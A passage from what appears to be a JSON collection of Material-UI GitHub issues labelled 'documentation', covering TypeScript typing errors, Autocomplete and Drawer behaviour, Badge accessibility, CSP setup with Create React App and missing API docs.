& CommonProps<...> & Pick<...>): Element', gave the following error.\r\n    Type 'string' is not assignable to type 'undefined'.\r\n  Overload 3 of 3, '(props: DefaultComponentProps<ExtendButtonBaseTypeMap<ButtonTypeMap<{}, \"button\">>>): Element', gave the following error.\r\n    Type '{ children: string; component: ForwardRefExoticComponent<Pick<LinkProps, \"slot\" | \"style\" | \"title\" | \"className\" | \"classes\" | \"innerRef\" | \"key\" | \"defaultChecked\" | \"defaultValue\" | \"suppressContentEditableWarning\" | ... 272 more ... | \"prefetch\"> & RefAttributes<...>>; href: string; variant: \"outlined\"; }' is not assignable to type 'IntrinsicAttributes & { children?: ReactNode; color?: \"inherit\" | \"default\" | \"primary\" | \"secondary\" | undefined; disabled?: boolean | undefined; ... 7 more ...; variant?: \"text\" | ... 2 more ... | undefined; } & { ...; } & CommonProps<...> & Pick<...>'.\r\n      Property 'component' does not exist on type 'IntrinsicAttributes & { children?: ReactNode; color?: \"inherit\" | \"default\" | \"primary\" | \"secondary\" | undefined; disabled?: boolean | undefined; ... 7 more ...; variant?: \"text\" | ... 2 more ... | undefined; } & { ...; } & CommonProps<...> & Pick<...>'.ts(2769)\r\nButton.d.ts(55, 5): The expected type comes from property 'variant' which is declared here on type 'IntrinsicAttributes & { component: ForwardRefExoticComponent<Pick<LinkProps, \"slot\" | \"style\" | \"title\" | \"className\" | \"classes\" | \"innerRef\" | \"key\" | \"defaultChecked\" | ... 274 more ... | \"prefetch\"> & RefAttributes<...>>; } & { ...; } & { ...; } & CommonProps<...> & Pick<...>'\r\n```\r\n## Expected Behavior 🤔\r\n\r\n<!-- Describe what should happen. -->\r\n\r\n- In `pages/index.tsx` I've made the same change but instead of using `variant=\"outlined\"`, I've used `color=\"secondary\"` and everything works as expected.\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  You should use the official codesandbox template as a starting point: https://material-ui.com/r/issue-template\r\n\r\n  If you have an issue concerning TypeScript please start from this TypeScript playground: https://material-ui.com/r/ts-issue-template\r\n\r\n  Issues without some form of live example have a longer response time.\r\n-->\r\n\r\nRefer to this codesandbox for a reproduction of the bug: https://codesandbox.io/s/bold-water-9xdld?file=/pages/about.tsx\r\n\r\n## Context 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\nI'm guessing this is a silly TypeScript issue (I'm still learning and appreciate the value but also get frustrated by silly things like this).  I want to be able to use the full power of buttons and not just certain combinations so this is blocking me.  [Other](https://gist.github.com/herr-vogel/0b5d4f3c28f08dc6cc4a2fd4f7b4a4df) [workarounds](https://dunglas.fr/2019/05/using-next-js-and-material-ui/) I've tried have various drawbacks as well..\r\n\r\n\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with TypeScript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.11.0  |\r\n| React       |  v16.13.1       |\r\n| TypeScript  | v4.0.2 (see codesandbox for .tsconfig)      |\r\n| Next.js | v9.5.3        |\r\n\r\n"},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\nEvents bound to DOM siblings of Autocomplete are ignored.\r\n\r\n[Codesandbox link](https://codesandbox.io/s/material-demo-forked-xtkg2?file=/demo.tsx)\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\nFor elements placed next to the Autocomplete component, any event on them is ignored. \r\n\r\n## Expected Behavior 🤔\r\n\r\n<!-- Describe what should happen. -->\r\nTo only capture event on Autocomplete and let the other elements pass their events.\r\nOr add another autocomplete close reason.\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  You should use the official codesandbox template as a starting point: https://material-ui.com/r/issue-template\r\n\r\n  If you have an issue concerning TypeScript please start from this TypeScript playground: https://material-ui.com/r/ts-issue-template\r\n\r\n  Issues without some form of live example have a longer response time.\r\n-->\r\n\r\nSteps:\r\n\r\n1. Place a link outside of autocomplete on a popper\r\n2. Click the link\r\n3. Autocomplete popper closes without capturing the event.\r\n\r\n## Context 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\nI'm simply trying to place a helper link above my autocomplete popper so those users who are unsure could navigate to the link and read about more information.\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with TypeScript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI core | v4.11.0  |\r\n| Material-UI lab | v4.0.0-alpha.52  |\r\n| React       |   v16.13.1   |\r\n| Browser     |  Chrome    |\r\n| TypeScript  |    v4.0.2     |"},{"labels":["documentation",null],"text":"\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\n#### Ao acessar  link https://material-ui.com/en/  in chrome e firefox  a page entra em um loop de recarregamento infinito.  \r\n\r\n## Expected Behavior 🤔\r\n\r\n#### In a normal page load there will be no infinite loop.\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n\r\nSteps:\r\n\r\n1. open chrome or firefox browser\r\n2. link access  https://material-ui.com/pt/en/ \r\n\r\n\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with TypeScript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n|  chrome      |  85.0.4183.83 |\r\n| firefox | 75  |\r\n| Linux-Ubuntu |  20.04 |  \r\n\r\n"},{"labels":[null,"documentation"],"text":"I don't see an api option to add aria-label in bottomNavigation compponent. How can we do that?"},{"labels":["documentation",null],"text":"- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary 💡\r\n\r\nI propose that the [CSP documentation](https://material-ui.com/styles/advanced/#content-security-policy-csp) be updated to also handle CSR applications in addition to SSR applications. \r\n\r\nMore specifically, a reference should be made to include the `INLINE_RUNTIME_CHUNK=false` flag in an `.env` file for applications built using the [CRA template](https://github.com/mui-org/material-ui/tree/master/examples/create-react-app). \r\n\r\n```\r\nBy default, Create React App will embed the runtime script into index.html during the production build. When set to false, the script will not be embedded and will be imported as usual. This is normally required when dealing with CSP.\r\n```\r\n([source](https://create-react-app.dev/docs/advanced-configuration/))\r\n\r\n## Examples 🌈\r\n\r\nWhen the `INLINE_RUNTIME_CHUNK=false` flag is not set, a user is liable to receive the following error: \r\n\r\n```\r\nRefused to execute inline script because it violates the following Content Security Policy directive: \"script-src 'self' static.zdassets.com www.googletagmanager.com www.google.com www.gstatic.com\". Either the 'unsafe-inline' keyword, a hash ('sha256-mB4hl8euSw00eXDUIRf8KeqpMfBXgg0FILGScPTo+n0='), or a nonce ('nonce-...') is required to enable inline execution.\r\n```\r\nWhen adding the specified hash to the Content Security Policy, the application works, but if deployed again, the hash changes and the Content Security Policy needs to be updated with the new hash. This is not feasible in the long term.\r\n\r\n## Motivation 🔦\r\nAdding CSP to a CSR app should be relatively straightforward using the `INLINE_RUNTIME_CHUNK=false` flag. By making mention of it in the docs, it will hopefully cut down the time needed to troubleshoot.\r\n"},{"labels":["documentation",null],"text":"Your documentation and examples recommend Roboto font.  I just downloaded it with npm and it installed 70+ packages, out of 180+ that it downloaded that are no longer supported, out of date, and have security issues.  I suggest replacing Roboto as default font for Material-UI and removing it from documentation.  It is high-risk to get users to download unsupported software."},{"labels":["documentation",null],"text":"Here is the link: https://next.material-ui.com/components/text-fields/#type-quot-number-quot\r\n\r\nOriginal code will cause a warning on the console when opening the website. Below is the original\r\n`<TextField inputProps={{ inputmode: 'numeric', pattern: '[0-9]*' }} />`\r\n\r\nIt should be\r\n`<TextField inputProps={{ inputMode: 'numeric', pattern: '[0-9]*' }} />`"},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\nIn the Tabs component, when trying to have forced scroll buttons visible, it still uses the default behavior of only showing the scroll buttons when needed.\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [✓] The issue is present in the latest release.\r\n- [✓] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n`scrollButtons: \"on\"` is ignored or doesn't work properly\r\n\r\n## Expected Behavior 🤔\r\n\r\n<!-- Describe what should happen. -->\r\nScroll buttons should always be visible\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  You should use the official codesandbox template as a starting point: https://material-ui.com/r/issue-template\r\n\r\n  If you have an issue concerning TypeScript please start from this TypeScript playground: https://material-ui.com/r/ts-issue-template\r\n\r\n  Issues without some form of live example have a longer response time.\r\n-->\r\n\r\nSteps:\r\n\r\n1. Navigate to https://material-ui.com/components/tabs/#forced-scroll-buttons\r\n"},{"labels":["documentation",null],"text":"The doco https://material-ui.com/api/text-field/ doesn't mention `onBlur` or `onFocus` as mentioned in https://github.com/mui-org/material-ui/pull/3356.\r\n\r\nI think you should introduce an 'events' section to add these and the documented `onChange` to."},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n\r\nWhen using the component `Transition`, the content \"appears\" instead of having the default behavior of not appearing on the first mount.\r\n\r\n## Expected Behavior 🤔\r\n\r\n<!-- Describe what should happen. -->\r\n\r\nThe component should not appear on the first mount, as stated on the [documentation](https://reactcommunity.org/react-transition-group/transition#Transition-prop-appear).\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  You should use the official codesandbox template as a starting point: https://material-ui.com/r/issue-template\r\n\r\n  If you have an issue concerning TypeScript please start from this TypeScript playground: https://material-ui.com/r/ts-issue-template\r\n\r\n  Issues without some form of live example have a longer response time.\r\n-->\r\n\r\nSteps:\r\n\r\n1. Use any Transition component without \"appear\" property.\r\n\r\nhttps://codesandbox.io/s/nice-hooks-fpi84?file=/src/Demo.js\r\n\r\n## Context 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with TypeScript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.11.0  |\r\n| React       |  16.13.1 |\r\n| Browser     |  Google Chrome 84.0.4147.125 (Official Build) (64-bit)  |\r\n| TypeScript  |  3.9.7 |"},{"labels":[null,null,null,"documentation"],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n--> _There is [this related issue](https://github.com/mui-org/material-ui/issues/21488), but the discussion ended up shifting away from the file upload button._\r\n\r\n## Current Behavior 😯\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n\r\nFollowing the [official file upload button example](https://material-ui.com/components/buttons/#upload-button), once one of the upload button is keyboard focused, pressing on `enter` or the `spacebar` does not do anything.\r\n\r\n## Expected Behavior 🤔\r\n\r\n<!-- Describe what should happen. -->\r\n\r\nFollowing the [official file upload button example](https://material-ui.com/components/buttons/#upload-button), once one of the upload button is keyboard focused, pressing on `enter` or the `spacebar` should open the file selection dialog.\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  You should use the official codesandbox template as a starting point: https://material-ui.com/r/issue-template\r\n\r\n  If you have an issue concerning TypeScript please start from this TypeScript playground: https://material-ui.com/r/ts-issue-template\r\n\r\n  Issues without some form of live example have a longer response time.\r\n-->\r\n\r\nSteps:\r\n\r\n1. Go to https://codesandbox.io/s/hidden-currying-e83y7\r\n2. Click on the `browser` part of the window.\r\n3. Press `tab` once or twice (to respectively select the first or the second button).\r\n4. Press `enter` or `spacebar`, nothing happens.\r\n\r\n## Context 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\nThis is an accessibility requirement: https://webaim.org/techniques/keyboard/#testing\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with TypeScript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.11.0  |\r\n| React       | v16.13.1 |\r\n| Browser     | Firefox 79.0 and Chromium 84.0.4147.89 (on Linux) |\r\n"},{"labels":["documentation"],"text":"Feature Summary - I am using material UI cards component on my website and want to lazyload images using npm package \"lazysizes\" which requires passing data-src attribute to lazyload images with SSR and maintaining search engine optimizations(this is required).\r\n\r\n```\r\n<CardMedia\r\n              component=\"img\"\r\n              alt=\"Cruiser Bikes\"\r\n              height=\"140\"\r\n              image=\"/assets/bike.jpg\"\r\n              title=\"Cruiser Bikes\"\r\n            />\r\n```\r\nTo achieve lazyloading I need to pass like this - \r\n`<img\r\n    data-sizes=\"auto\"\r\n    data-src=\"image2.jpg\"\r\n    data-srcset=\"image1.jpg 300w,\r\n    image2.jpg 600w,\r\n    image3.jpg 900w\" class=\"lazyload\" />`\r\n\r\nI see two props image and src but I need to pass data-src attribute to lazy load image with SEO and SSR. I am using Next.js+React.js to achieve this. Any help would be appreciated.\r\n"},{"labels":[null,"documentation",null],"text":"- [x] The issue is present in the latest release. \r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nWithin lab version 4.0.0-alpha.56, core 4.11.0, when you use `startAdornment` within `InputProps` in Autocomplete, as well as multiple. The multiple tags do not appear but act as though you triggered them.\r\n\r\n## Expected Behavior 🤔\r\n\r\nHave a `startAdornment` persisting at the same time as using multiple tags\r\n\r\n## Steps to Reproduce 🕹\r\n\r\nProof can be found [here](https://codesandbox.io/s/material-ui-autocomplete-startadornment-proof-of-concept-vi1zh?file=/src/Demo.js)\r\nWithin said demo you will see 2 autocomplete fields, the only difference (besides the ID) is that the top (broken) one sets the `startAdornment` to \"test\", whilst the second does not.\r\nPlain code can also be found [here](https://starb.in/JcVoWu.js) incase for some reason the sandbox doesn't work.\r\n\r\nSteps:\r\n\r\n1. Setup a autocomplete\r\n2. Setup renderInput\r\n3. RenderInput uses TextField\r\n4. TextField sets InputProps\r\n5. InputProps sets `startAdornment` (whether it is text or icon doesn't matter)\r\n\r\n## Context 🔦\r\n\r\nAttempting to use the startAdornment as a \"pending\" kind of tag. So the user first uses AC to figure out what \"tag\" then when that is done, it is passed to startAdornment, and based upon that, the user is then prompted with AC based upon said \"tag\".\r\n\r\n## Your Environment 🌎\r\n\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI/core | v4.11.0  |\r\n| Material-UI/lab | v4.0.0-alpha.56 |\r\n| React       | v16.13.1 |\r\n"},{"labels":[null,null,"documentation",null],"text":"- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary 💡\r\n\r\nIt would be helpful to have a little more flexible control over both nodes used to compose the `<Badge>`, so the badge can display the correct UI for sighted users and also render a helpful label for assistive technology.\r\n\r\n## Examples 🌈\r\n\r\nIn my app we have a link in the primary nav that wraps badge wrapping an icon, used to indicate the total number of notifications for the current user. \r\n\r\n<img width=\"70\" alt=\"Screen Shot 2020-08-04 at 5 51 30 PM\" src=\"https://user-images.githubusercontent.com/7654254/89348787-25b28780-d67b-11ea-8702-17f6ef14142f.png\">\r\n\r\n**Demo**: https://codesandbox.io/s/material-demo-cc7rw?file=/demo.js\r\n\r\n```jsx\r\nconst notificationsCount = 1000\r\n\r\n<a href=\"/notifications\">\r\n  <Badge badgeContent={notificationsCount} color=\"primary\">\r\n    <MailIcon titleAccess=\"notifications\" />\r\n  </Badge>\r\n</a>\r\n```\r\n\r\nBut with the above markup the link's accessible name — used when screen readers encounter the link, for example — is \r\n\r\n> notifications 99+\r\n\r\n<img width=\"184\" alt=\"Screen Shot 2020-08-02 at 11 20 31 PM\" src=\"https://user-images.githubusercontent.com/7654254/89349958-1cc2b580-d67d-11ea-9b71-41275ce8d05e.png\">\r\n\r\nwhen it would ideally be\r\n\r\n> 99+ notifications\r\n\r\n<img width=\"181\" alt=\"Screen Shot 2020-08-02 at 11 21 14 PM\" src=\"https://user-images.githubusercontent.com/7654254/89349972-21876980-d67d-11ea-991f-476ce62ee9d5.png\">\r\n\r\nOne option is to change the DOM order of these nodes and put the [`{children}` after the `<span>{displayValue}</span>`](https://github.com/mui-org/material-ui/blob/master/packages/material-ui/src/Badge/Badge.js#L191). If it's safe to assume that this is a logical DOM order for most users, and it doesn't affect the visual layout, then that seems like a reasonable solution. \r\n\r\nBut I was hoping to have full props access to the `<span>{displayValue}</span>` node, so I could find another solution like hiding it from assistive technology using `aria-hidden` and moving the equivalent of `displayValue` to the accessible icon title. It's a little annoying that we'd have to recreate the logic of `displayValue`, but I could live with that.\r\n\r\n<img width=\"206\" alt=\"Screen Shot 2020-08-04 at 6 04 41 PM\" src=\"https://user-images.githubusercontent.com/7654254/89349902-01f04100-d67d-11ea-9783-63c929d0822c.png\">\r\n\r\n**Demo**: https://codesandbox.io/s/material-demo-3ghl7?file=/demo.js\r\n\r\n```jsx\r\nconst notificationsCount = 1000\r\nconst max = 99;\r\nconst displayValue = notificationsCount > max ? `${max}+` : notificationsCount;\r\n\r\n<a href=\"/notifications\">\r\n  <Badge\r\n    badgeContent={notificationsCount}\r\n    color=\"primary\"\r\n    displayValueProps={{ \"aria-hidden\": true }}\r\n  >\r\n    <MailIcon titleAccess={`${displayValue} notifications`} />\r\n  </Badge>\r\n</a>\r\n```\r\n\r\nUnfortunately that's not part of [the `<Badge>` API](https://material-ui.com/api/badge/), so that's not possible. And using the `classes` prop won't help here, either, since there's no CSS that will hide a node from assistive technology and preserve it visually, only the opposite (e.g. `display: none`). So the resulting accessible label is \r\n\r\n> 99+ notifications 99+\r\n\r\n<img width=\"206\" alt=\"Screen Shot 2020-08-04 at 6 04 41 PM\" src=\"https://user-images.githubusercontent.com/7654254/89350413-fb15fe00-d67d-11ea-8c10-c24aeac38ed4.png\">\r\n\r\nThe next option I tried was wrapping the `badgeContent` in an `aria-hidden` node directly, but that breaks some more default functionality, like passing in my own `displayValue` and specifiying that it should be hidden when the count is `0`. If it were possible for the `<Badge>` component to read `children` as [the equivalent of `innerText`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/innerText) and then parse it as an integer, then `<span aria-hidden>8</span>` could still be parsed as the number `8` instead of a string or a component, etc.\r\n\r\n<img width=\"181\" alt=\"Screen Shot 2020-08-04 at 6 19 10 PM\" src=\"https://user-images.githubusercontent.com/7654254/89350997-17666a80-d67f-11ea-9d98-c3faaf3fe73b.png\">\r\n\r\n**Demo**: https://codesandbox.io/s/material-demo-fxbpy?file=/demo.js\r\n\r\n```jsx\r\nconst notificationsCount = 1000\r\nconst max = 99;\r\nconst displayValue = notificationsCount > max ? `${max}+` : notificationsCount;\r\n\r\n<a href=\"/notifications\">\r\n  <Badge\r\n    badgeContent={<span aria-hidden>{displayValue}</span>}\r\n    color=\"primary\"\r\n    invisible={notificationsCount === 0}\r\n  >\r\n    <MailIcon titleAccess={`${displayValue} notifications`} />\r\n  </Badge>\r\n</a>\r\n```\r\n\r\nFinally, it all works! But it seems unnecessarily painful to get there. \r\n\r\nI recognize there are other options, still, like \r\n\r\n**Demo**: https://codesandbox.io/s/material-demo-ycehq?file=/demo.js\r\n\r\n```jsx\r\nconst notificationsCount = 1000\r\n\r\n<a href=\"/notifications\">\r\n  <Badge badgeContent={notificationsCount} color=\"primary\">\r\n    <MailIcon />\r\n  </Badge>\r\n  <span className=\"visually-hidden\">notifications</span>\r\n</a>\r\n```\r\n\r\nBut either changing the default DOM order of the two nodes or providing props access to the `displayValue` both seem like reasonable enhancements, as well. \r\n\r\n## Motivation 🔦\r\n\r\nI'd love to leverage of all the great existing logic and UI built into `<Badge>`, instead of re-writing big chunks of it to accomodate an accessible label. "},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nThe dropdown is not shown on clicking the \"Add Labels\" button.\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n\r\n## Expected Behavior 🤔\r\n\r\nThe popper should be opened and we would be able to see the content inside it i.e. the \"Autocomplete\" component.\r\n\r\n<!-- Describe what should happen. -->\r\n\r\n## Steps to Reproduce 🕹\r\n\r\nI have added a sandbox for the above mentioned steps. Kindly have a look into it.\r\nhttps://codesandbox.io/s/blissful-dewdney-utnpv\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  You should use the official codesandbox template as a starting point: https://material-ui.com/r/issue-template\r\n\r\n  If you have an issue concerning TypeScript please start from this TypeScript playground: https://material-ui.com/r/ts-issue-template\r\n\r\n  Issues without some form of live example have a longer response time.\r\n-->\r\n\r\n## Context 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\nI have a use case where I need to open up the autocomplete API on top of a Dialog component, however the dropdown never seems to appear. I debugged the following issue and I found that when I click on the \"add labels\" option it sets the \"anchorEl\" as it should do, thanks to the \"handleClick\" function, but immediately after that the \"onClose\" prop of \"Autocomplete\" component gets fired which sets the \"anchorEl\" back to null. Therefore the dropdown never seems to appear. Again on digging deeper, I logged the \"reason\" variable provided to \"handleClose\" which shows an event \"blur\" when I click on the element to display the dropdown.\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with TypeScript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.9.7  |\r\n| React       |    16.13.1     |\r\n| Browser     |    Firefox     |\r\n| TypeScript  |  3.6.4  |\r\n| etc.        |         |\r\n"},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the feature in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [ ] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary 💡\r\n\r\nIn my app, I use nextjs links for navigation items. But `BottomNavigationItem` doesn't support `Link` (Next.js)\r\n\r\n## Examples 🌈\r\n\r\n<!--\r\n  Provide a link to the Material design specification, other implementations,\r\n  or screenshots of the expected behavior.\r\n-->\r\n\r\n## Motivation 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has the lack of this feature affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n"},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the feature in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary 💡\r\n\r\nCurrently you have to choose between either `variant=\"persistent\"` where the `Drawer`s `children` remains in the DOM (is only mounted once) but you can't get a backdrop, or `variant=\"temporary\"` where you get a backdrop but each time the drawer is opened/closed it appears to be remounted, causing images in my `Drawer`'s `children` to be reloaded if the browser cache doesn't return them (which is my case trying to display a user's profile picture from FB Oauth that doesn't seem to get cached, each time I open/close the `Drawer` a new network request is made for their profile picture's `src`)\r\n\r\n## Examples 🌈\r\n\r\n<!--\r\n  Provide a link to the Material design specification, other implementations,\r\n  or screenshots of the expected behavior.\r\n-->\r\nI expected to be able to do something like this in order to use `persistent` variant behaviour while still showing the backdrop when open:\r\n```ts\r\n  <Drawer\r\n    variant=\"persistent\"\r\n    BackdropComponent={(props) => <Backdrop {...props} open />}\r\n    BackdropProps={{ invisible: !props.open }}\r\n    {...props}\r\n  />\r\n```\r\n\r\nBut it behaves like a normal `persistent` `Drawer` (doesn't show backdrop) and throws an error in console:\r\n```\r\nWarning: React does not recognize the `BackdropComponent` prop on a DOM element. If you intentionally want it to appear in the DOM as a custom attribute, spell it as lowercase `backdropcomponent` instead. If you accidentally passed it from a parent component, remove it from the DOM element.\r\n    in div (created by ForwardRef(Drawer))\r\n    in ForwardRef(Drawer) (created by WithStyles(ForwardRef(Drawer)))\r\n```\r\n\r\n\r\n## Motivation 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has the lack of this feature affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\nI'm trying to display a user's profile picture from FB Oauth that doesn't get cached (response for the `img`'s `src` returns an `Expires` header of the same time as the request), each time I open/close the `Drawer` a new network request is made for their profile picture's `src` because it isn't cached and so when the `Drawer` gets mounted to DOM upon opening the browser thinks it has to make a new request. Using `variant=\"persistent\"` solves this by keeping the `img` in the DOM when the `Drawer` isn't open, but then I lose the \"modal\" behaviour of `variant=\"temporary\"` which is what I want."},{"labels":[null,"documentation"],"text":"That's all for my request. I doubt anyone wants to get stuck with a default dark blue unless it matches their design scheme. It is a lot of work trying to figure out how to change the color. I am still digging through your docs.\r\n\r\nHonestly, I use Materialize CSS a lot more just because Material-UI is overwhelming. And I *know* React!\r\n\r\nThanks :)"},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\nI'm checking current API documentation for ToggleButton https://material-ui.com/api/toggle-button/, and I don't see the `size` prop being mentioned there. But, the `size` property does affect the size of the `ToggleButton`. (I'm using the ToggleButton as a standalone though, not within the `ToggleButtonGroup`.)\r\n\r\nExploring the code for 4.11.0 I see this:\r\nhttps://github.com/mui-org/material-ui/blob/v4.11.0/packages/material-ui-lab/src/ToggleButton/ToggleButton.js#L78\r\nhttps://github.com/mui-org/material-ui/blob/v4.11.0/packages/material-ui-lab/src/ToggleButton/ToggleButton.js#L159-L162\r\n\r\nAnd in the `next` branch this:\r\n![image](https://user-images.githubusercontent.com/19698636/88644664-8b26d700-d0c3-11ea-8ce3-0107e11a6afb.png)\r\n\r\n\r\nDoes this mean the property is intentionally missing from the API, as it is not intended to be used by the users, so that it is only used internally by the enclosing `ToggleButtonGroup` component?\r\n\r\n\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [ X] The issue is present in the latest release.\r\n- [ X] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a 